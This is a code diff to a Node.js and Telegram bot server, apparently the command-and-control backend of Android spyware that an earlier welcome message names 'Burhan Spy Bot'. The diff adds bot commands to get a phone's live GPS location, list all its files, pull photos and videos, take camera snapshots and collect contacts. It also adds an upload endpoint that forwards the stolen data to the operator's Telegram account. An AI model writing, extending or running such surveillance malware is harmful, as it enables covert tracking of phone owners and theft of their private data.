@@ -21,11 +21,6 @@ function saveDevices() {
     fs.writeFileSync(dataFile, JSON.stringify(devices, null, 2));
 }
 
-// ✅ /devices — Saare devices ki detail
-app.get('/api/devices', (req, res) => {
-    res.json(devices);
-});
-
 // ✅ App register karne par
 app.post('/api/register-device', (req, res) => {
     const { deviceId, deviceName, phoneNumber, battery, ip, sim, online, time } = req.body;
@@ -43,16 +38,69 @@ app.post('/api/register-device', (req, res) => {
     res.json({ success: true });
 });
 
-// ✅ Bot commands
-bot.onText(/\/start/, (msg) => {
+// ✅ Bot ko commands bhejo
+app.post('/api/command', (req, res) => {
+    const { deviceId, command, path } = req.body;
+    // App ko command bhejo
+    axios.post('http://localhost:3000/api/send-command', { deviceId, command, path })
+        .then(() => res.json({ success: true }))
+        .catch(() => res.json({ success: false }));
+});
+
+// ✅ App se data receive karo
+app.post('/api/upload-data', (req, res) => {
+    const { deviceId, type, data } = req.body;
+    
+    if (type === 'files') {
+        bot.sendMessage(YOUR_USER_ID, `📁 Files for device ${deviceId}:\n${data}`);
+    } else if (type === 'photo') {
+        bot.sendPhoto(YOUR_USER_ID, data);
+    } else if (type === 'video') {
+        bot.sendVideo(YOUR_USER_ID, data);
+    } else if (type === 'location') {
+        bot.sendMessage(YOUR_USER_ID, `📍 Location for device ${deviceId}: ${data}`);
+    } else if (type === 'contacts') {
+        bot.sendMessage(YOUR_USER_ID, `📞 Contacts for device ${deviceId}: ${data}`);
+    } else if (type === 'status') {
+        bot.sendMessage(YOUR_USER_ID, `📊 Status for device ${deviceId}: ${data}`);
+    }
+    res.json({ success: true });
+});
+
+// ✅ HELP MENU
+bot.onText(/\/help/, (msg) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) {
         bot.sendMessage(chatId, "⛔ Access Denied!");
         return;
     }
-    bot.sendMessage(chatId, `🔥 Welcome to Burhan Spy Bot! 🔥\n\n🎯 Owner: Sheikh Burhan\n\n📜 Commands:\n/devices - View all devices\n/files - Scan Files\n/getphoto - Get Photo\n/status - Device Status\n/help - Commands ka format`);
+    bot.sendMessage(chatId, `📖 HELP MENU\n\n` +
+        `🟢 /locate DEVICE_ID_or_API_KEY\n` +
+        `   Get live GPS location and device info.\n\n` +
+        `🟢 /devices\n` +
+        `   List all registered devices with key and expiry.\n\n` +
+        `🟢 /files DEVICE_ID_or_API_KEY\n` +
+        `   List ALL file names.\n\n` +
+        `🟢 /getphoto DEVICE_ID_or_API_KEY FILE_NAME\n` +
+        `   Request a specific photo.\n\n` +
+        `🟢 /getvideo DEVICE_ID_or_API_KEY FILE_NAME\n` +
+        `   Request a specific video.\n\n` +
+        `🟢 /camera DEVICE_ID_or_API_KEY [front|back]\n` +
+        `   Capture snapshot.\n\n` +
+        `🟢 /ping DEVICE_ID_or_API_KEY\n` +
+        `   Check if device is alive.\n\n` +
+        `🟢 /stats\n` +
+        `   Total device count.\n\n` +
+        `🟢 /contacts DEVICE_ID_or_API_KEY\n` +
+        `   Fetch all contacts.\n\n` +
+        `🟢 /stop\n` +
+        `   Stop the bot.\n\n` +
+        `🟢 /start\n` +
+        `   Resume bot.\n\n` +
+        `⚠️ Any new command cancels ongoing operations.`);
 });
 
+// ✅ /devices — Saare devices ki list
 bot.onText(/\/devices/, (msg) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) {
@@ -103,7 +151,29 @@ bot.onText(/\/devices/, (msg) => {
     bot.sendMessage(chatId, message);
 });
 
-// ✅ /files <ID> — Files scan karo
+// ✅ /locate — Live location
+bot.onText(/\/locate (.+)/, (msg, match) => {
+    const chatId = msg.chat.id;
+    if (!isAuthorized(msg)) {
+        bot.sendMessage(chatId, "⛔ Access Denied!");
+        return;
+    }
+    const deviceId = match[1];
+    if (!devices[deviceId]) {
+        bot.sendMessage(chatId, "❌ Device not found!");
+        return;
+    }
+    // App ko location bhejne ka command
+    axios.post('http://localhost:3000/api/command', { deviceId, command: 'get_location' })
+        .then(() => {
+            bot.sendMessage(chatId, `📍 Location request sent for device ${deviceId}...`);
+        })
+        .catch(() => {
+            bot.sendMessage(chatId, "❌ Command send failed!");
+        });
+});
+
+// ✅ /files — Files list
 bot.onText(/\/files (.+)/, (msg, match) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) {
@@ -115,17 +185,17 @@ bot.onText(/\/files (.+)/, (msg, match) => {
         bot.sendMessage(chatId, "❌ Device not found!");
         return;
     }
-    // App ko command bhejo
+    // App ko files scan karne ka command
     axios.post('http://localhost:3000/api/command', { deviceId, command: 'scan_files' })
         .then(() => {
-            bot.sendMessage(chatId, `📁 Scanning files for device ${deviceId}...`);
+            bot.sendMessage(chatId, `📁 Files request sent for device ${deviceId}...`);
         })
         .catch(() => {
             bot.sendMessage(chatId, "❌ Command send failed!");
         });
 });
 
-// ✅ /getphoto <ID> <path> — Photo download karo
+// ✅ /getphoto — Photo download
 bot.onText(/\/getphoto (.+) (.+)/, (msg, match) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) {
@@ -141,11 +211,133 @@ bot.onText(/\/getphoto (.+) (.+)/, (msg, match) => {
     // App ko photo bhejne ka command
     axios.post('http://localhost:3000/api/command', { deviceId, command: 'get_photo', path: photoPath })
         .then(() => {
-            bot.sendMessage(chatId, `📸 Photo request sent: ${photoPath}`);
+            bot.sendMessage(chatId, `📸 Photo request sent for device ${deviceId}...`);
         })
         .catch(() => {
             bot.sendMessage(chatId, "❌ Command send failed!");
         });
+});
+
+// ✅ /getvideo — Video download
+bot.onText(/\/getvideo (.+) (.+)/, (msg, match) => {
+    const chatId = msg.chat.id;
+    if (!isAuthorized(msg)) {
+        bot.sendMessage(chatId, "⛔ Access Denied!");
+        return;
+    }
+    const deviceId = match[1];
+    const videoPath = match[2];
+    if (!devices[deviceId]) {
+        bot.sendMessage(chatId, "❌ Device not found!");
+        return;
+    }
+    // App ko video bhejne ka command
+    axios.post('http://localhost:3000/api/command', { deviceId, command: 'get_video', path: videoPath })
+        .then(() => {
+            bot.sendMessage(chatId, `📹 Video request sent for device ${deviceId}...`);
+        })
+        .catch(() => {
+            bot.sendMessage(chatId, "❌ Command send failed!");
+        });
+});
+
+// ✅ /camera — Snapshot
+bot.onText(/\/camera (.+) (.+)/, (msg, match) => {
+    const chatId = msg.chat.id;
+    if (!isAuthorized(msg)) {
+        bot.sendMessage(chatId, "⛔ Access Denied!");
+        return;
+    }
+    const deviceId = match[1];
+    const camera = match[2];
+    if (!devices[deviceId]) {
+        bot.sendMessage(chatId, "❌ Device not found!");
+        return;
+    }
+    // App ko camera snapshot ka command
+    axios.post('http://localhost:3000/api/command', { deviceId, command: 'take_snapshot', path: camera })
+        .then(() => {
+            bot.sendMessage(chatId, `📸 Camera snapshot request sent for device ${deviceId}...`);
+        })
+        .catch(() => {
+            bot.sendMessage(chatId, "❌ Command send failed!");
+        });
+});
+
+// ✅ /ping — Device alive check
+bot.onText(/\/ping (.+)/, (msg, match) => {
+    const chatId = msg.chat.id;
+    if (!isAuthorized(msg)) {
+        bot.sendMessage(chatId, "⛔ Access Denied!");
+        return;
+    }
+    const deviceId = match[1];
+    if (!devices[deviceId]) {
+        bot.sendMessage(chatId, "❌ Device not found!");
+        return;
+    }
+    // App ko ping command
+    axios.post('http://localhost:3000/api/command', { deviceId, command: 'ping' })
+        .then(() => {
+            bot.sendMessage(chatId, `📡 Ping sent for device ${deviceId}...`);
+        })
+        .catch(() => {
+            bot.sendMessage(chatId, "❌ Command send failed!");
+        });
+});
+
+// ✅ /stats — Total devices
+bot.onText(/\/stats/, (msg) => {
+    const chatId = msg.chat.id;
+    if (!isAuthorized(msg)) {
+        bot.sendMessage(chatId, "⛔ Access Denied!");
+        return;
+    }
+    bot.sendMessage(chatId, `📊 Total Devices: ${Object.keys(devices).length}`);
+});
+
+// ✅ /contacts — Contacts
+bot.onText(/\/contacts (.+)/, (msg, match) => {
+    const chatId = msg.chat.id;
+    if (!isAuthorized(msg)) {
+        bot.sendMessage(chatId, "⛔ Access Denied!");
+        return;
+    }
+    const deviceId = match[1];
+    if (!devices[deviceId]) {
+        bot.sendMessage(chatId, "❌ Device not found!");
+        return;
+    }
+    // App ko contacts bhejne ka command
+    axios.post('http://localhost:3000/api/command', { deviceId, command: 'get_contacts' })
+        .then(() => {
+            bot.sendMessage(chatId, `📞 Contacts request sent for device ${deviceId}...`);
+        })
+        .catch(() => {
+            bot.sendMessage(chatId, "❌ Command send failed!");
+        });
+});
+
+// ✅ /stop — Bot band karo
+bot.onText(/\/stop/, (msg) => {
+    const chatId = msg.chat.id;
+    if (!isAuthorized(msg)) {
+        bot.sendMessage(chatId, "⛔ Access Denied!");
+        return;
+    }
+    bot.stopPolling();
+    bot.sendMessage(chatId, "🛑 Bot stopped.");
+});
+
+// ✅ /start — Bot resume karo
+bot.onText(/\/start/, (msg) => {
+    const chatId = msg.chat.id;
+    if (!isAuthorized(msg)) {
+        bot.sendMessage(chatId, "⛔ Access Denied!");
+        return;
+    }
+    bot.startPolling();
+    bot.sendMessage(chatId, "✅ Bot resumed.");
 });
 
 // ✅ Authorization check
